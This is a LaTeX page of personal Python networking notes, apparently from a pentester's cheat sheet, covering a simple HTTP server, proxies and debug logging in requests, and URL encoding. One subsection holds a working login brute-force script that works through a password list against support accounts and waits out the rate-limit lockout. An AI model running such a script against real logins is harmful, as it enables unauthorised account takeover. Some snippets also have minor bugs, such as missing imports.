\section{http}

\subsection{http.server}

\begin{verbatim}
import http.server
import socketserver

class ReuseTCPServer(socketserver.TCPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory="www", **kwargs)
    def log_message(self, format, *func_args):
        if args.reverse:
            return
        else:
            super().log_message(format, *func_args)

    def log_request(self, format, *func_args):
        if args.reverse:
            return
        else:
            super().log_request(format, *func_args)

def serve_http():
    with ReuseTCPServer(("", args.port), Handler) as httpd:
        httpd.serve_forever()

serve_http()    
\end{verbatim}


\subsection{Requests}


\url{https://requests.readthedocs.io/en/latest/}
\subsubsection{Simple Simple}
\begin{verbatim}
proxies = {
   'http': 'http://proxy.example.com:8080',
   'https': 'http://secureproxy.example.com:8090',
}

response = requests.post(url, proxies=proxies)
\end{verbatim}


\subsubsection{Session proxy}
You may also find yourself wanting to scrape from websites that utilize
sessions, in this case, you would have to create a session object. You can do
this by first creating a \verb+session+ variable and setting it to the requests
\verb+Session()+ method. Then similar to before, you would send your session
proxies through the requests method, but this time only passing in the
\verb+url+ as the argument.

\begin{verbatim}
session = requests.Session()

session.proxies = {
   'http': 'http://10.10.10.10:8000',
   'https': 'http://10.10.10.10:8000',
}

response = session.get(url)
\end{verbatim}


\subsubsection{logging}
\bf{Solution 1}
\begin{verbatim}
import requests
import http
import logging

# Set up logging to a file
logging.basicConfig(filename="app.log", level=logging.DEBUG)
logger = logging.getLogger(__name__)
http.client.HTTPConnection.debuglevel = 1

# Monkey patch the print() function and redirect it to a logger.debug() call
def print_to_log(*args):
    logger.debug(" ".join(args))
http.client.print = print_to_log

# Test HTTP GET and POST
url = "http://localhost:5000/test"

logger.info("Sending HTTP GET")
resp = requests.get(url)

logger.info("Sending HTTP POST")
resp = requests.post(url, data='My Test Data')
\end{verbatim}

\bf{solution 2} 
\begin{verbatim}
import logging
import contextlib
try:
    from http.client import HTTPConnection # py3
except ImportError:
    from httplib import HTTPConnection # py2

def debug_requests_on():
    '''Switches on logging of the requests module.'''
    HTTPConnection.debuglevel = 1

    logging.basicConfig()
    logging.getLogger().setLevel(logging.DEBUG)
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.DEBUG)
    requests_log.propagate = True

def debug_requests_off():
    '''Switches off logging of the requests module, might be some side-effects'''
    HTTPConnection.debuglevel = 0

    root_logger = logging.getLogger()
    root_logger.setLevel(logging.WARNING)
    root_logger.handlers = []
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.WARNING)
    requests_log.propagate = False

@contextlib.contextmanager
def debug_requests():
    '''Use with 'with'!'''
    debug_requests_on()
    yield
    debug_requests_off()
\end{verbatim}

call:
\begin{verbatim}
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> debug_requests_on()
>>> requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
DEBUG:requests.packages.urllib3.connectionpool:"GET / HTTP/1.1" 200 12150
send: 'GET / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: keep-alive\r\nAccept-
Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.11.1\r\n\r\n'
reply: 'HTTP/1.1 200 OK\r\n'
header: Server: nginx
...
<Response [200]>

>>> debug_requests_off()
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> with debug_requests():
...     requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
...
<Response [200]>
\end{verbatim}


\subsubsection{example}
\begin{verbatim}
import requests
import time
url = "http://{}/login.php".format(ip)
# rate limit blocks for 30 seconds
lock_time = 30
# message that alert us we hit rate limit
lock_message = "Too many login failure"
# read user and password
for username in ["support.cn", "support.gr", "support.it",  "support.us"]:
    with open(userpass_file, "r") as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            password = fline.rstrip()
            data = {
                "userid": username,
                "passwd": password,
                "submit": "submit"
            }
    
            #print(" test {} ".format(password))
            # do the request
            res = requests.post(url, headers=headers, data=data)
            #print(res.text)
    
            # handle generic credential error
            if "Invalid credentials" in res.text:
                print("[-] Invalid credentials: userid:{} passwd:{}".format(user
name, password))
            elif lock_message in res.text:
                print("[-] Hit rate limit, sleeping 30")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
            else:
                print("[+++++++++++] Valid credentials: userid:{} passwd:{}".for
mat(username, password))
                exit()

\end{verbatim}

\subsection{URL Encoding query strings or form parameters}
\url{https://www.urlencoder.io/python/}

\begin{verbatim}
>>> import urllib.parse
>>> query = 'Hellö Wörld@Python'
>>> urllib.parse.quote(query)
'Hell%C3%B6%20W%C3%B6rld%40Python'


urllib.parse.quote('/', safe='')
'%2F'

# encode + - 
>>> import urllib.parse
>>> query = 'Hellö Wörld@Python'
>>> urllib.parse.quote_plus(query)
'Hell%C3%B6+W%C3%B6rld%40Python'


>>> import urllib.parse
>>> params = {'q': 'Python URL encoding', 'as_sitesearch': 'www.urlencoder.io'}
>>> urllib.parse.urlencode(params)
'q=Python+URL+encoding&as_sitesearch=www.urlencoder.io'

# If you want the urlencode() function to use the quote() function for encoding parameters
urllib.parse.urlencode(params, quote_via=urllib.parse.quote)


>>> import urllib.parse
>>> params = {'name': 'Rajeev Singh', 'phone': ['+919999999999', '+628888888888']}
>>> urllib.parse.urlencode(params, doseq=True)
'name=Rajeev+Singh&phone=%2B919999999999&phone=%2B628888888888'



\end{verbatim}


